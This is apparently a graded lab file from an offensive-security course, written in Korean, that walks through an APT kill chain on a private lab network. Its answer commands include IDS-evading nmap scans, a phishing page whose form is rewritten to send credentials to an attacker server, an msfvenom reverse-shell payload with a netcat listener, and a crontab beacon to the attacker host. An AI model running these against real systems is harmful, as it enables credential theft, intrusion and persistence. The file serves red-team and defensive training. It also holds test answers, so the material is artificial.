lab_id: "attack-adv-nonai-week01"
title: "APT 킬체인 분석과 공격 시뮬레이션"
version: "non-ai"
course: "attack-adv-nonai"
week: 1
description: "APT(Advanced Persistent Threat) 킬체인의 7단계를 심층 분석하고, 각 단계별 공격 기법을 실습 환경에서 시뮬레이션한다. Lockheed Martin 킬체인과 MITRE ATT&CK 프레임워크를 매핑하여 실제 위협 그룹의 TTPs를 재현한다."
difficulty: "hard"
duration_minutes: 120
objectives:
  - "APT 킬체인 7단계(정찰→무기화→전달→익스플로잇→설치→C2→목표달성)를 실습으로 이해한다"
  - "MITRE ATT&CK 매트릭스와 킬체인을 매핑하여 공격 시나리오를 구성한다"
  - "각 킬체인 단계에서 사용되는 도구와 기법을 직접 적용한다"
pass_threshold: 0.6
steps:
  - order: 1
    instruction: "nmap을 사용하여 10.20.30.0/24 네트워크의 활성 호스트를 스텔스 스캔(-sS)으로 탐지하라. 타이밍 옵션을 T2로 설정하여 IDS 회피를 시도하라."
    hint: "nmap -sS -T2 옵션을 사용하면 SYN 스캔을 느린 속도로 수행하여 탐지를 회피할 수 있다"
    category: "recon"
    points: 10
    answer: "nmap -sS -T2 10.20.30.0/24"
    answer_detail: "SYN 스캔(-sS)은 TCP 3-way handshake를 완료하지 않아 연결 로그에 남지 않는 스텔스 기법이다. T2(polite) 타이밍은 패킷 전송 간격을 늘려 IDS/IPS의 임계값 기반 탐지를 회피한다. APT 정찰 단계에서 가장 기본적인 기법이다."
    verify:
      type: "output_contains"
      expect: "10.20.30."
      field: "stdout"
  - order: 2
    instruction: "발견된 호스트 10.20.30.80에 대해 서비스 버전 탐지(-sV)와 OS 핑거프린팅(-O)을 동시에 수행하라. 스크립트 스캔도 포함하라."
    hint: "-sV -O -sC 옵션을 조합하면 상세 정보를 한 번에 수집할 수 있다"
    category: "recon"
    points: 10
    answer: "nmap -sV -O -sC 10.20.30.80"
    answer_detail: "-sV는 서비스 배너를 분석하여 정확한 버전을 식별하고, -O는 TCP/IP 스택 특성으로 OS를 추정한다. -sC는 기본 NSE 스크립트를 실행하여 추가 정보(SSL 인증서, HTTP 제목 등)를 수집한다. 이는 킬체인 정찰 단계에서 공격 표면을 정의하는 핵심 과정이다."
    verify:
      type: "output_contains"
      expect: "open"
      field: "stdout"
  - order: 3
    instruction: "nmap NSE 스크립트를 활용하여 10.20.30.80의 HTTP 서비스에서 알려진 취약점을 탐색하라. vuln 카테고리 스크립트를 실행하라."
    hint: "--script vuln 옵션으로 취약점 탐지 스크립트를 일괄 실행할 수 있다"
    category: "recon"
    points: 10
    answer: "nmap --script vuln -p 80,443,3000 10.20.30.80"
    answer_detail: "NSE(Nmap Scripting Engine)의 vuln 카테고리에는 CVE 기반 취약점 탐지 스크립트가 포함된다. http-vuln-*, ssl-heartbleed, smb-vuln-* 등이 자동 실행되며, 이는 킬체인의 정찰→무기화 전환 단계에서 공격 벡터를 선정하는 데 활용된다."
    verify:
      type: "output_contains"
      expect: "VULNERABLE"
      field: "stdout"
  - order: 4
    instruction: "curl을 사용하여 웹서버(10.20.30.80:3000)에서 피싱 페이지로 활용할 수 있는 로그인 페이지의 HTML 소스를 다운로드하라. 출력을 /tmp/phish_template.html에 저장하라."
    hint: "curl -o 옵션으로 파일로 저장할 수 있다"
    category: "exploit"
    points: 10
    answer: "curl -s -o /tmp/phish_template.html http://10.20.30.80:3000/"
    answer_detail: "APT 무기화 단계에서 스피어 피싱 이메일에 첨부할 피싱 페이지를 제작한다. 대상 조직의 실제 로그인 페이지를 복제하면 사회공학 공격의 성공률이 높아진다. HTML을 수정하여 자격증명을 공격자 서버로 전송하도록 변조한다."
    verify:
      type: "output_contains"
      expect: "phish_template.html"
      field: "stdout"
  - order: 5
    instruction: "다운로드한 피싱 템플릿에서 form action URL을 공격자 서버(10.20.30.201:4444)로 변조하라. sed를 사용하여 인라인 수정하라."
    hint: "sed -i 's/원본/대체/g' 파일명 형태로 사용한다"
    category: "exploit"
    points: 10
    answer: "sed -i 's|action=\"[^\"]*\"|action=\"http://10.20.30.201:4444/capture\"|g' /tmp/phish_template.html"
    answer_detail: "피싱 페이지의 form action을 변조하면 피해자가 입력한 자격증명이 공격자 서버로 전송된다. 실제 APT 그룹은 이를 더 정교하게 처리하여 원본 사이트로 리다이렉트하여 피해자가 인지하지 못하게 한다. 이는 킬체인의 전달(Delivery) 단계에 해당한다."
    verify:
      type: "output_contains"
      expect: "10.20.30.201:4444"
      field: "stdout"
  - order: 6
    instruction: "netcat을 사용하여 10.20.30.201에서 포트 4444로 리스닝 상태를 만들어 리버스 셸 수신 준비를 하라. 백그라운드로 실행하라."
    hint: "nc -lvnp 포트번호로 리스닝 모드를 설정한다"
    category: "exploit"
    points: 10
    answer: "nc -lvnp 4444 &"
    answer_detail: "C2(Command & Control) 채널 설정의 기본은 리버스 셸이다. 리스너를 먼저 구성하고 페이로드가 실행되면 연결이 수립된다. APT 그룹은 단순 netcat 대신 Cobalt Strike, Metasploit Handler 등을 사용하지만, 원리는 동일하다. 포트 4444는 실습용이며 실제로는 80, 443 등 일반 포트를 사용한다."
    verify:
      type: "output_contains"
      expect: "listening"
      field: "stdout"
  - order: 7
    instruction: "msfvenom을 사용하여 Linux용 리버스 셸 페이로드를 생성하라. LHOST=10.20.30.201, LPORT=4444, 포맷은 elf로 설정하라."
    hint: "msfvenom -p linux/x64/shell_reverse_tcp 옵션을 사용한다"
    category: "exploit"
    points: 10
    answer: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/payload.elf"
    answer_detail: "msfvenom은 Metasploit의 페이로드 생성 도구로, 다양한 OS와 아키텍처에 맞는 셸코드를 생성한다. APT 무기화 단계에서 드로퍼(Dropper)나 백도어를 제작할 때 사용된다. 실제 APT 그룹은 커스텀 페이로드를 사용하지만, 원리 학습에는 msfvenom이 적합하다."
    verify:
      type: "output_contains"
      expect: "payload.elf"
      field: "stdout"
  - order: 8
    instruction: "생성된 페이로드의 해시값(SHA256)을 계산하고, VirusTotal에서 탐지될 수 있는지 확인하기 위해 strings 명령으로 시그니처 문자열을 검사하라."
    hint: "sha256sum과 strings 명령을 조합한다"
    category: "analysis"
    points: 10
    answer: "sha256sum /tmp/payload.elf && strings /tmp/payload.elf"
    answer_detail: "페이로드의 해시값은 위협 인텔리전스에서 IoC(Indicator of Compromise)로 활용된다. strings 명령으로 바이너리에서 읽을 수 있는 문자열을 추출하면 AV 시그니처에 포함될 수 있는 패턴을 확인할 수 있다. APT 그룹은 패킹, 인코딩, 커스텀 암호화로 탐지를 회피한다."
    verify:
      type: "output_contains"
      expect: "/bin/sh"
      field: "stdout"
  - order: 9
    instruction: "MITRE ATT&CK 프레임워크에서 Persistence 기법을 시뮬레이션하라. crontab에 매 5분마다 공격자 서버로 비콘을 보내는 항목을 추가하라(실습용, 실제 연결은 안 됨)."
    hint: "crontab -e 대신 echo와 crontab을 조합하여 비대화형으로 추가한다"
    category: "exploit"
    points: 10
    answer: "(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://10.20.30.201:4444/beacon') | crontab -"
    answer_detail: "Persistence(지속성 확보)는 킬체인 설치 단계의 핵심이다. crontab을 통한 주기적 비콘은 가장 단순한 지속성 기법이며, MITRE ATT&CK T1053.003(Scheduled Task/Job: Cron)에 해당한다. 실제 APT는 systemd 서비스, init.d 스크립트, 커널 모듈 등 더 은밀한 방법을 사용한다."
    verify:
      type: "output_contains"
      expect: "beacon"
      field: "stdout"
  - order: 10
    instruction: "설치한 crontab 비콘 항목을 확인하고, 방어자 관점에서 이를 탐지하기 위해 /var/log/syslog에서 cron 관련 로그를 검색하라."
    hint: "crontab -l로 현재 등록된 작업을 확인하고, grep으로 로그를 검색한다"
    category: "analysis"
    points: 10
    answer: "crontab -l && grep -i cron /var/log/syslog | tail -20"
    answer_detail: "방어자는 crontab 변경을 모니터링하여 비인가 스케줄링을 탐지한다. auditd로 crontab 파일 변경을 감시하거나, SIEM에서 cron 관련 syslog를 수집하여 이상 패턴을 탐지할 수 있다. 이는 킬체인 분석에서 양측 관점을 이해하는 데 중요하다."
    verify:
      type: "output_contains"
      expect: "beacon"
      field: "stdout"
  - order: 11
    instruction: "환경변수를 활용한 은닉 기법을 시뮬레이션하라. 환경변수에 Base64로 인코딩된 페이로드 명령을 저장하고, 디코딩하여 실행 가능한 형태로 출력하라."
    hint: "echo 명령 | base64로 인코딩하고, echo $변수 | base64 -d로 디코딩한다"
    category: "exploit"
    points: 10
    answer: "export PAYLOAD=$(echo 'whoami && id && hostname' | base64) && echo $PAYLOAD | base64 -d"
    answer_detail: "환경변수에 인코딩된 페이로드를 저장하는 기법은 파일리스(Fileless) 공격의 일종이다. 디스크에 흔적을 남기지 않아 파일 기반 AV를 회피할 수 있다. MITRE ATT&CK T1027(Obfuscated Files or Information)과 T1059.004(Unix Shell)에 해당하며, 메모리 포렌식으로만 탐지 가능한 경우가 많다."
    verify:
      type: "output_contains"
      expect: "whoami"
      field: "stdout"
  - order: 12
    instruction: "wget을 사용하여 대상 웹서버(10.20.30.80:3000)의 전체 사이트를 재귀적으로 미러링하라. 깊이는 2단계로 제한하라."
    hint: "wget --mirror 또는 -r 옵션과 -l(레벨) 옵션을 조합한다"
    category: "recon"
    points: 10
    answer: "wget -r -l 2 -P /tmp/mirror http://10.20.30.80:3000/ 2>&1 | tail -5"
    answer_detail: "사이트 미러링은 오프라인 분석을 위해 전체 웹 구조를 복제하는 기법이다. APT 정찰 단계에서 웹 애플리케이션의 구조, 숨겨진 경로, JavaScript 내 API 엔드포인트 등을 분석할 수 있다. 실제 공격에서는 대역폭과 로그를 고려하여 선택적으로 다운로드한다."
    verify:
      type: "output_contains"
      expect: "saved"
      field: "stdout"
  - order: 13
    instruction: "킬체인 목표 달성 단계를 시뮬레이션하라. 대상 웹서버에서 /etc/hostname 파일의 내용을 확인하고, 시스템 정보를 수집하여 /tmp/exfil_data.txt에 저장하라."
    hint: "curl로 웹 취약점을 통해 파일을 읽거나, 로컬에서 수집하여 저장한다"
    category: "exploit"
    points: 10
    answer: "cat /etc/hostname > /tmp/exfil_data.txt && uname -a >> /tmp/exfil_data.txt && ip addr >> /tmp/exfil_data.txt && cat /tmp/exfil_data.txt"
    answer_detail: "킬체인의 최종 단계인 목표 달성(Actions on Objectives)에서는 데이터 수집과 유출이 이루어진다. 시스템 정보, 네트워크 구성, 사용자 목록 등을 수집하여 외부로 전송한다. MITRE ATT&CK의 Collection(TA0009)과 Exfiltration(TA0010) 전술에 해당한다."
    verify:
      type: "output_contains"
      expect: "10.20.30"
      field: "stdout"
  - order: 14
    instruction: "수집한 데이터를 Base64로 인코딩하여 DNS 쿼리를 통한 데이터 유출을 시뮬레이션하라. /tmp/exfil_data.txt의 내용을 인코딩하고 출력하라."
    hint: "base64 명령으로 파일 내용을 인코딩하고, 출력 결과를 DNS 서브도메인으로 사용할 수 있다"
    category: "exploit"
    points: 15
    answer: "cat /tmp/exfil_data.txt | base64 -w 63 | head -5"
    answer_detail: "DNS 기반 데이터 유출(DNS Exfiltration)은 방화벽이 DNS 트래픽(포트 53)을 허용하는 점을 악용한다. 데이터를 Base64로 인코딩하여 DNS 쿼리의 서브도메인으로 전송하면(예: encoded-data.attacker.com) 일반 DNS 트래픽으로 위장된다. MITRE ATT&CK T1048.003(Exfiltration Over Alternative Protocol: DNS)에 해당한다."
    verify:
      type: "output_contains"
      expect: "=="
      field: "stdout"
  - order: 15
    instruction: "APT 공격 시뮬레이션의 정리 단계로, 생성한 crontab 항목을 제거하고, 임시 파일을 삭제한 후, 전체 킬체인 단계별 사용 기법을 요약하여 /tmp/killchain_report.txt에 작성하라."
    hint: "crontab -r로 전체 삭제하고, echo로 보고서를 작성한다"
    category: "analysis"
    points: 15
    answer: "crontab -l | grep -v beacon | crontab - && rm -f /tmp/payload.elf /tmp/exfil_data.txt && echo -e '=== APT Kill Chain Report ===\\n1. Recon: nmap stealth scan\\n2. Weaponization: msfvenom payload\\n3. Delivery: phishing template\\n4. Exploitation: reverse shell\\n5. Installation: crontab persistence\\n6. C2: netcat listener\\n7. Actions: data collection & exfil' > /tmp/killchain_report.txt && cat /tmp/killchain_report.txt"
    answer_detail: "APT 시뮬레이션 후 정리(Cleanup)는 레드팀 운영의 필수 절차이다. 실습 환경의 무결성을 유지하고, 킬체인 각 단계에서 사용한 기법을 문서화한다. 보고서에는 각 단계의 도구, 기법, MITRE ATT&CK ID를 포함하여 방어 전략 수립에 활용한다."
    verify:
      type: "output_contains"
      expect: "Kill Chain Report"
      field: "stdout"
